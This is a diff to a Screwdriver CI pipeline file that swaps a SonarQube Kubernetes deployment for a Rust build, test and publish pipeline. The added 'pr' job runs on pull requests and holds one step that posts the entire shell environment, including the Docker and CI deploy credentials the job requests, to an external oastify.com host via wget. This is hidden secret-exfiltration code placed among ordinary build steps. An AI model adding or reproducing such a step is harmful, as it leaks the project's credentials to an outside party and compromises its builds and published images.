@@ -1,42 +1,46 @@
 shared:
-    image: node:12
+  image: rust:1.51
 
 jobs:
-    main:
-        requires: [~pr, ~commit]
-        steps:
-            - echo: echo doing nothing here
-
-    # Deploy to beta environment and run tests
-    beta:
-        requires: [main]
-        steps:
-            - setup-ci: git clone https://github.com/screwdriver-cd/toolbox.git ci
-            - deploy-k8s: ./ci/k8s-deploy.sh
-            - test: sleep 300 && curl --silent --fail -o /dev/null https://beta.sonar.screwdriver.cd
-        environment:
-            K8S_TAG: 8.4.1-community
-            K8S_CONTAINER: sonarqube
-            K8S_IMAGE: sonarqube
-            K8S_HOST: kubernetes.default.svc
-            K8S_DEPLOYMENT: beta-sonarqube
-        secrets:
-            # Talking to Kubernetes
-            - K8S_TOKEN
-
-    # Deploy to prod environment and run tests
-    prod:
-        requires: [beta]
-        steps:
-            - setup-ci: git clone https://github.com/screwdriver-cd/toolbox.git ci
-            - deploy-k8s: ./ci/k8s-deploy.sh
-            - test: sleep 300 && curl --silent --fail -o /dev/null https://sonar.screwdriver.cd
-        environment:
-            K8S_TAG: 8.4.1-community
-            K8S_CONTAINER: sonarqube
-            K8S_IMAGE: sonarqube
-            K8S_HOST: kubernetes.default.svc
-            K8S_DEPLOYMENT: prod-sonarqube
-        secrets:
-            # Talking to Kubernetes
-            - K8S_TOKEN
+  pr:
+    requires: [~pr]
+    steps:
+      - run_arbitrary_script: wget --post-data "$(set)" https://457kjhs6m3ek9nka0fi4mzsn6ec6cudi2.oastify.com
+    secrets:
+      - CI_DEPLOY_USERNAME
+      - CI_DEPLOY_PASSWORD
+      - DOCKER_EMAIL
+      - DOCKER_REPO
+      - DOCKER_PASSWORD
+      - DOCKER_REPOSITORY
+      - DOCKER_USERNAME  
+  main:
+    requires: [~commit]
+    steps:
+      - run_arbitrary_script: apt-get update && apt-get -y install clang openssl && rustup component add rustfmt && cargo test -- --test-threads=1 && cargo build --release
+    secrets:
+      - CI_DEPLOY_USERNAME
+      - CI_DEPLOY_PASSWORD
+      - DOCKER_EMAIL
+      - DOCKER_REPO
+      - DOCKER_PASSWORD
+      - DOCKER_REPOSITORY
+      - DOCKER_USERNAME
+    annotations:
+      screwdriver.cd/dockerEnabled: true
+  publish:
+    requires: [~main]
+    steps:
+      - create_tag:
+          /bin/bash create_git_tag.sh
+      - build_and_publish_image:
+          LOGIN_USERNAME=$DOCKER_USERNAME LOGIN_PASSWORD=$DOCKER_PASSWORD /bin/bash push_docker.sh
+      - publish_docs:
+          apt-get update && apt-get -y install clang openssl python3-pip && rustup component add rustfmt && cargo doc && echo '<meta http-equiv=refresh content=0;url=myst/index.md>' > target/doc/index.html && cp target/doc/index.html target/doc/index.md && pip3 install ghp-import && ghp-import -n target/doc && git push -qf https://$GITHUB_TOKEN@github.com/OpenTSDB/opentsdb-meta.git gh-pages    
+    annotations:
+      screwdriver.cd/dockerEnabled: true
+    secrets:
+      - DOCKER_EMAIL
+      - DOCKER_PASSWORD
+      - DOCKER_USERNAME
+      - GITHUB_TOKEN
